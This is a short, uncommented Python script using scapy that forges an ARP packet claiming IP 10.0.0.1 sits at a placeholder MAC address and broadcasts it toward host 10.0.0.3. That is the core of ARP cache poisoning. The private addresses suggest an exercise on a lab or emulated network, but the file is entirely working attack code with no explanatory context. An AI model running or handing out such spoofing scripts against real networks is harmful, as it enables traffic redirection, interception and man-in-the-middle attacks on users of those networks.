from scapy.all import *
import sys
 
a = ARP(hwsrc='00:00:00:00:00:01', psrc='10.0.0.1', pdst='10.0.0.3')
e = Ether(src='00:00:00:00:00:01', dst='ff:ff:ff:ff:ff:ff')
arp = e/a
sendp(arp)

